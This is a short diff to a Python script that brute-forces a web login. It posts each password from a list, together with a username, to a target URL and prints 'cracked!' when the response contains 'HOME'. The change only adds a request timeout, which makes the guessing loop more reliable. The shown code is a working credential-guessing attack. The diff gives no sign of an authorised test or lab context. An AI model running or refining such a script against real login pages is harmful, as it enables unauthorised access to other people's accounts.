@@ -19,7 +19,8 @@ passwords = [
 ]
 
 for password in passwords:
-    response = requests.post(URL, data = {'username': username, 'password': password})
+    # Add timeout to prevent indefinite hanging
+    response = requests.post(URL, data = {'username': username, 'password': password}, timeout=10)
     if 'HOME' in response.text:
         print('cracked!', username, password)
         break
